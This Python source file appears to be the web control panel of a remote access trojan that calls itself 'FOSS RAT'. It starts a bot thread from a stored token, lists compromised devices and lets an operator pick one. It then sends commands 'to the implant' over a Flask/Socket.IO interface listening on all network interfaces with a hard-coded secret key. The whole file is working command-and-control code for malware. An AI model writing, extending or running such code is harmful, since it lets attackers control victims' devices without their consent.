import os
from flask import Flask, render_template
from flask_socketio import SocketIO
from queue import Queue
import logging

# Import the bot components from your existing script
from control_center_ui import BotThread, TOKEN_PATH

# --- Configuration ---
HOST = '0.0.0.0'  # Listen on all network interfaces
PORT = 7777

# Disable Flask's default logging to keep the console clean for our app's logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# --- Flask App Setup ---
app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret-key-for-foss-rat' # Replace with a real secret key if deploying
socketio = SocketIO(app, async_mode='threading')

# --- Global Variables ---
# We create the queues and bot thread here, so the web server can access them
command_queue = Queue()
stream_queue = Queue() # Although not used by the web UI, the bot needs it
bot_thread = None

# --- Core Functions ---
def log_to_clients(message):
    """Sends a log message to all connected web clients."""
    print(message) # Also print to server console
    socketio.emit('new_log', {'message': message})

# --- Socket.IO Event Handlers ---
@socketio.on('connect')
def handle_connect():
    """When a client connects, log it and send them the current device list."""
    log_to_clients('[WEBUI] Client connected.')
    handle_refresh_devices() # Auto-refresh for the new client

@socketio.on('refresh_devices')
def handle_refresh_devices():
    """Client requested a device list refresh."""
    if bot_thread and bot_thread.bot.is_ready():
        bot_thread.command_queue.put({"type": "refresh_devices"})
        # Give the bot a moment to process the command
        socketio.sleep(1.5)
        devices = list(bot_thread.bot.device_channels.keys())
        selected = bot_thread.bot.selected_channel.name if bot_thread.bot.selected_channel else "None"
        socketio.emit('update_devices', {'devices': sorted(devices), 'selected': selected})
        log_to_clients(f'[WEBUI] Refreshed device list. Found {len(devices)} devices.')
    else:
        log_to_clients('[WEBUI-ERROR] Bot is not ready. Cannot refresh.')

@socketio.on('select_device')
def handle_select_device(data):
    """Client selected a device from the list."""
    device_name = data.get('name')
    if bot_thread and bot_thread.bot.is_ready() and device_name:
        bot_thread.bot.selected_channel = bot_thread.bot.device_channels.get(device_name)
        if bot_thread.bot.selected_channel:
            log_to_clients(f"[WEBUI] Selected device: {device_name}")
            # Notify all clients of the change
            socketio.emit('device_selected', {'name': device_name})
        else:
            log_to_clients(f"[WEBUI-ERROR] Could not select device: {device_name}")

@socketio.on('dispatch_command')
def handle_dispatch(data):
    """Client sent a command to be dispatched to the implant."""
    command = data.get('command')
    args = data.get('args', "")
    friendly_name = data.get('friendly_name', command)

    if not bot_thread.bot.selected_channel:
        log_to_clients("[WEBUI-ERROR] No device selected!")
        return

    command_queue.put({"type": "dispatch", "data": {"command": command, "args": args}})
    log_to_clients(f"[DISPATCH] Sent '{friendly_name}' to '{bot_thread.bot.selected_channel.name}'")


# --- Flask Routes ---
@app.route('/')
def index():
    """Serves the main HTML page."""
    return render_template('index.html')


# --- Main Execution ---
if __name__ == "__main__":
    if not os.path.exists(TOKEN_PATH):
        print(f"FATAL: {TOKEN_PATH} not found!")
    else:
        with open(TOKEN_PATH, 'r') as f:
            token = f.read().strip()

        # We must assign to the global variable
        bot_thread = BotThread(token=token, command_queue=command_queue, stream_queue=stream_queue)
        bot_thread.daemon = True
        bot_thread.start()

        print("="*40)
        print(" FOSS RAT Web UI")
        print(f" Access the control panel at http://127.0.0.1:{PORT}")
        print("="*40)
        
        socketio.run(app, host=HOST, port=PORT, debug=False)